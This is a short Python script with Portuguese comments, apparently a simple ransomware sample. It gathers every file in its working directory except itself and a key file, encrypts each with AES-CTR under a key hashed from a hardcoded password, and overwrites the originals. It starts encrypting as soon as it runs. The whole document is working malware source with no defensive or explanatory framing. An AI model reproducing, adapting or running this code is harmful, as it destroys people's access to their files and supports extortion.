import os
import pyaes
import hashlib

arquivos = []
#Bloco para buscar os arquivos 
def ScanArquivo():
 
    for arquivo in os.listdir():
        if arquivo == "Cry_xpx.py" or arquivo == "key.py":
            continue
        if os.path.isfile(arquivo):
            arquivos.append(arquivo)
    print(arquivos)
    xpxActionxpx()
#Bloco Para gerar Chave  
def Key(dados):
    Senha= "Minha@Senha".encode()
    key = hashlib.sha256(Senha).digest()
    aes = pyaes.AESModeOfOperationCTR(key)
    dados_xpx = aes.encrypt(dados)
    return dados_xpx
#bloco para criptografar os arquivos
def xpxActionxpx():
    for arquivo in arquivos:
        with open(arquivo,"rb") as xpx:
            data =xpx.read()
            xpx_data = Key(data)
        with open(arquivo,"wb") as xpx_Cry:
            xpx_Cry.write(xpx_data)

ScanArquivo()